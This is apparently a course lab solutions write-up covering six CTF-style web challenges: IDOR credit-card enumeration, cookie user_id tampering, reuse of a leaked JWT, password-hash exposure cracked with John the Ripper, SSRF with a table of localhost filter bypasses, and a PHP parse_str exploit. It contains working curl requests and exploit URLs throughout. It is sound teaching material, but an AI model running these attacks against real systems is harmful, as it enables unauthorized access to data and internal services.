# Lab 05: Access Control, SSRF & Deprecated Functions - Solutions

---

# 1. GlockenEmil 2.0 – Direct Object Reference (DOR)

## Challenge Overview

**Goal**: Access other customers' credit card information by exploiting an access control vulnerability.

**Credentials**: `customer0/compass0`

---

## Vulnerability

| Vulnerability                               | Description                                                           |
| ------------------------------------------- | --------------------------------------------------------------------- |
| **Insecure Direct Object Reference (IDOR)** | API exposes resources by predictable IDs without authorization checks |

---

## What is IDOR?

IDOR occurs when an application exposes internal object references (like database IDs) and doesn't verify the user is authorized to access them.

**Example**: If you can access your data at `/api/user/123`, what happens when you try `/api/user/124`?

---

## Attack Chain

### Step 1: Find Your Own Credit Card Endpoint

1. Login as `customer0/compass0`
2. Click "Credit Cards" (top right)
3. Open DevTools → Network tab
4. Observe the API call:

```
GET /api/creditcard/5404000000000001
```

The credit card number itself is used as the object ID.

### Step 2: Enumerate Other Credit Cards

Since credit card numbers are sequential, try nearby numbers:

```
GET /api/creditcard/5404000000000002
GET /api/creditcard/5404000000000003
...
```

### Step 3: Access Another Customer's Data

```bash
curl 'https://<target>/api/creditcard/5404000000000002' \
  -H 'Authorization: Bearer <your_jwt_token>'
```

**Result**: Full credit card details returned without authorization check!

---

## Answer

| Field     | Value                                              |
| --------- | -------------------------------------------------- |
| URL Used  | `https://<target>/api/creditcard/5404000000000002` |
| CC Number | `5404000000000002`                                 |
| CVV       | `570`                                              |
| Expiry    | `05/2024`                                          |
| Type      | Mastercard                                         |

**API Response**:

```json
{
  "statusCode": 200,
  "data": {
    "creditCard": {
      "_id": "5aa0481e876d9d39d4397860",
      "number": "5404000000000002",
      "type": "Mastercard",
      "cvv": "570",
      "month": 5,
      "year": 2024
    }
  }
}
```

---

## Why This Works

The API:

1. Uses predictable/sequential identifiers (credit card numbers)
2. Doesn't verify the requesting user owns the requested resource
3. Returns sensitive data to any authenticated user

---

# 2. A Cookie for a Hacker

## Challenge Overview

**Goal**: Access administrator's secret notes by exploiting an access control vulnerability in cookie handling.

---

## Vulnerability

| Vulnerability             | Description                                              |
| ------------------------- | -------------------------------------------------------- |
| **Broken Access Control** | `user_id` cookie trusted without verifying `auth_cookie` |

---

## Attack Chain

### Step 1: Register and Observe Cookies

1. Register with any username/password
2. Post some notes
3. Inspect cookies in DevTools:

```
auth_cookie=3c640f1a15305945a7ecd3397c093cec829603031b921f4435144d0f33403615
user_id=100
```

### Step 2: Understand the Flaw

The application:

- Sets `auth_cookie` (authentication hash)
- Sets `user_id` (identifies the user)
- **Only checks `user_id` for authorization**, ignoring `auth_cookie`

### Step 3: Enumerate Admin User ID

Use Burp Intruder or ZAP Fuzz to try different `user_id` values:

```http
GET /notes HTTP/1.1
Cookie: auth_cookie=<your_cookie>; user_id=§1§
```

Iterate through user IDs (1, 2, 3, ... 100) and look for different responses.

### Step 4: Access Admin Notes

Found admin at `user_id=83`:

```
Cookie: auth_cookie=3c640f1a15305945a7ecd3397c093cec829603031b921f4435144d0f33403615; user_id=83
```

**Result**: Admin's secret notes (with flag) displayed!

---

## Answer

| Field    | Value |
| -------- | ----- |
| Admin ID | `83`  |

> **Note**: User ID `2370` also contains special system information.

---

# 3. GlockenEmil 2.0 – JWT

## Challenge Overview

**Goal**: Apply unauthorized discounts to orders by exploiting JWT handling vulnerabilities.

**Credentials**: `customer0/compass0`

---

## Vulnerability

| Vulnerability          | Description                                    |
| ---------------------- | ---------------------------------------------- |
| **JWT Token Exposure** | Retailer JWT token leaked in API documentation |

---

## What is JWT?

JSON Web Token (JWT) is a compact, URL-safe token format:

```
header.payload.signature
```

Example decoded payload:

```json
{
  "isRetailer": false,
  "username": "customer0",
  "iat": 1523354622
}
```

The `isRetailer: true` flag grants discount privileges.

---

## Attack Chain

### Step 1: Find API Documentation

Browse to discover API docs:

```
https://<target>/api/
```

**Found**: Documentation revealing retailer discount endpoint and a sample JWT token!

### Step 2: Extract Retailer Token

The API docs contain an example with a valid retailer JWT:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjp0cnVlLCJfaWQiOiI1YWNjODUxZmM4YmMyNjIyMTRjMDFlZTUiLCJ1c2VybmFtZSI6InJldGFpbGVyMCIsImZpcnN0bmFtZSI6IkphY2tvYiIsImxhc3RuYW1lIjoiTcO8bGxlciIsImVtYWlsIjoiSmFja29iLk11ZWxsZXJAZ21haWwuY29tIiwiaWF0IjoxNTIzMzU0NjIyLCJhdWQiOiJzZWxmIiwiaXNzIjoid2Vic2hvcCJ9.7eDbsqhJ0jyXdKWsjyVgpT5ZL6JIWlBMH8laQ6XYghQ
```

Decoded payload shows `"isRetailer": true`.

### Step 3: Find Order ID

1. Login as `customer0/compass0`
2. Click "Orders" (top right)
3. Capture the order ID from network traffic (e.g., `671542d8c4b40100358170cd`)

### Step 4: Apply Unauthorized Discount

```bash
curl 'https://<target>/api/retailer/order/<order_id>/applyDiscount/' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjp0cnVlLC...' \
  -H 'Cookie: chatUser=5aa0481e876d9d39d439787a'
```

**Result**: Discount applied to order!

---

## Fundamental Security Problem

1. **Token Leakage**: Valid retailer JWT exposed in API documentation (should use fake/placeholder tokens)
2. **Long-Lived Token**: Leaked token still valid - should use short-lived tokens with refresh mechanism

---

# 4. SCHOGGI: API Excessive Data Exposure

## Challenge Overview

**Goal**: Extract user passwords by exploiting overly permissive API endpoints.

**Credentials**: `alice/alice.123`

---

## Vulnerability

| Vulnerability               | Description                                           |
| --------------------------- | ----------------------------------------------------- |
| **Excessive Data Exposure** | API endpoints return sensitive data (password hashes) |

---

## Attack Chain

### Step 1: Enumerate Users

```bash
curl 'https://<target>/api/users'
```

**Response**: List of all users with their IDs.

### Step 2: Get Individual User Details

For each user ID, request detailed info:

```bash
curl 'https://<target>/api/user/101'
curl 'https://<target>/api/user/102'
...
```

**Response includes**: Username AND password hash!

### Step 3: Identify Hash Algorithm

Looking at the hash format (64 hex characters = 256 bits):

- Likely **SHA-256** (raw-sha256 in john)

### Step 4: Create Hash File

```
alice:765adadbce1bcddb3bcbdbf7c8e312b5f3fd6b1fa278b8d884eb1cb8552fb1a1
bob:985089972f3b4fc822a99bb38b6051935954944265f932a88e6e265bb9d2f90c
charlie:5cb7285acef8307dd824faa96b4956971730641083237f393bded9591ff10eae
victor:59fe46987db46666b335c749636abb06ca23f73fc10bb943066e660ddc7410f7
...
```

### Step 5: Crack with John the Ripper

```bash
# Download wordlist
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/Pwdb_top-10000.txt

# Crack passwords
john --format=raw-sha256 --wordlist=Pwdb_top-10000.txt hashes.txt

# Show results
john --show hashes.txt
```

---

## Cracked Passwords

| Username | Password   |
| -------- | ---------- |
| victor   | `q1w2e3r4` |

---

# 5. GlockenEmil 2.0 – SSRF (Server-Side Request Forgery)

## Challenge Overview

**Goal**: Access internal resources containing secret information via SSRF.

**Credentials**: `customer0/compass0`

---

## Vulnerability

| Vulnerability | Description                                          |
| ------------- | ---------------------------------------------------- |
| **SSRF**      | Server fetches user-supplied URLs without validation |

---

## Attack Chain

### Step 1: Find Internal Resource Hint

On the main page, one post has a broken image link pointing to:

```
http://internal-server:8765/file002.jpg
```

This reveals an internal service on port 8765.

### Step 2: Attempt Direct Access (Fails)

```bash
curl http://internal-server:8765/file002.jpg
```

→ Connection refused (internal network only)

### Step 3: Exploit SSRF via Community Posts

1. Login as `customer0/compass0`
2. Click "Community" (top right)
3. Create a post with external image URL

The server fetches the URL on our behalf!

### Step 4: Bypass Localhost Filters

Try various localhost representations:

| URL                                 | Result     |
| ----------------------------------- | ---------- |
| `http://127.0.0.1:8765/file002.jpg` | Blocked    |
| `http://localhost:8765/file002.jpg` | Blocked    |
| `http://::1:8765/file002.jpg`       | Blocked    |
| `http://0.0.0.0:8765/file002.jpg`   | **Works!** |

### Step 5: Extract Secret from Image

The SSRF endpoint is `/api/post/url`. Create a post with the internal URL:

```bash
curl 'https://<target>/api/post/url' \
  -H 'Authorization: Bearer <jwt_token>' \
  -H 'Content-Type: application/json' \
  --data-raw '{"url":"http://0.0.0.0:8765/file002.jpg","post":{"title":"test","text":"test"}}'
```

Download the fetched image and examine EXIF data:

```bash
exiftool file002.jpg
```

**Output**:

```
ExifTool Version Number         : 12.57
File Name                       : d9c3a970a6f3fe9d240716ca87ca6cb0.jpg
Image Description               : ebec318f-83c0-4d29-b6af-5a65a85322f8
...
```

**Flag from EXIF**: `ebec318f-83c0-4d29-b6af-5a65a85322f8`

The image contains embedded passwords:

| System                       | Password                            |
| ---------------------------- | ----------------------------------- |
| Java                         | `iLikeTrains`                       |
| Unix Masters of the Universe | `OneDoesNotSimplyEnterTheUnixWorld` |
| Data Secure Storage          | `NotSoSecureStorage`                |
| Enterprise Multiplexer 99    | `OnePlusOneEqualsFour`              |

---

## Localhost Bypass Techniques

| Technique       | Example                                        |
| --------------- | ---------------------------------------------- |
| IPv4 localhost  | `127.0.0.1`                                    |
| IPv6 localhost  | `::1`, `[::1]`                                 |
| Decimal IP      | `2130706433` (= 127.0.0.1)                     |
| Hex IP          | `0x7f000001`                                   |
| Zero address    | `0.0.0.0`                                      |
| Domain redirect | `localtest.me`, `spoofed.burpcollaborator.net` |

---

# 6. Historia Animalum

## Challenge Overview

**Goal**: Extract a secret flag by exploiting multiple PHP vulnerabilities including deprecated functions and buggy code.

---

## Vulnerabilities

| Vulnerability              | Description                                   |
| -------------------------- | --------------------------------------------- |
| **Information Disclosure** | Vim backup file (`index.php~`) accessible     |
| **Deprecated parse_str()** | Creates arbitrary variables from query string |
| **Buggy Code**             | Incorrect variable handling allows bypass     |

---

## Attack Chain

### Step 1: Find the Main Page

Use gobuster to discover files:

```bash
gobuster dir -e -u https://<target> -w /usr/share/wordlists/dirb/common.txt
```

**Found**: `index.php`

### Step 2: Find Backup File

The page mentions "Made with vim". Vim creates backup files!

```bash
gobuster dir -e -u https://<target> -w /usr/share/wordlists/dirb/common.txt -d
```

Or try common vim backup patterns:

- `index.php~`
- `index.php.bak`
- `.index.php.swp`

**Found**: `index.php~` (vim backup)

### Step 3: Analyze Source Code

Fetch the backup:

```bash
curl https://<target>/index.php~
```

Key PHP code discovered:

```php
parse_str($_SERVER['QUERY_STRING']);  // DEPRECATED: Creates variables from URL params!

$string = parse_str($_SERVER['QUERY_STRING']);  // BUG: parse_str has no return value

if (!empty($string['wolve'])) {
    // ... never executes because $string is null
}

if ($page === '$_SERVER[REMOTE_ADDR]') {  // BUG: Comparing to literal string, not variable!
    // ... echo secret if conditions met
    echo $secret;
}
```

### Step 4: Understand the Bugs

1. **Deprecated `parse_str()`**: Without second parameter, creates global variables from query string

   - `?foo=bar` creates `$foo = "bar"`

2. **No return value**: `$string = parse_str(...)` sets `$string` to NULL

   - All `$string['...']` accesses fail

3. **Wrong comparison**: `$page === '$_SERVER[REMOTE_ADDR]'` compares to the **literal string** `$_SERVER[REMOTE_ADDR]`, not the actual IP

### Step 5: Craft Exploit URL

The key code in the backup file:

```php
require_once 'secret.php';  // Loads $_ with the actual flag
// ...
echo (!empty($secret) && $secret === '5e8586c3355551da6d48a5aa10dd7b85ca93404c0f1a7ead6cd1343f45320b3b') ? $_ : 'no flag here.';
```

The real flag is stored in `$_` (from `secret.php`). It only displays the flag if `$secret` **exactly matches** that hardcoded hash. Random values → "no flag here."

Since `parse_str($query)` creates global variables from URL params:

```
https://<target>/index.php?page=$_SERVER[REMOTE_ADDR]&secret=5e8586c3355551da6d48a5aa10dd7b85ca93404c0f1a7ead6cd1343f45320b3b
```

---

## Why This Works

```
URL: ?page=$_SERVER[REMOTE_ADDR]&secret=5e8586c3...
           ↓
parse_str() creates:
  $page = "$_SERVER[REMOTE_ADDR]"  (literal string!)
  $secret = "5e8586c3..."
           ↓
if ($page === '$_SERVER[REMOTE_ADDR]')  → TRUE!
           ↓
if ($secret === '5e8586c3...')  → TRUE!
           ↓
echo $_;  → Shows the real flag from secret.php!
```

---

## Answer

| Field       | Value                                                            |
| ----------- | ---------------------------------------------------------------- |
| Exploit URL | `https://<target>/index.php?page=$_SERVER[REMOTE_ADDR]&secret=5e8586c3355551da6d48a5aa10dd7b85ca93404c0f1a7ead6cd1343f45320b3b` |
| Flag        | _(displayed from `$_` variable loaded by `secret.php`)_          |
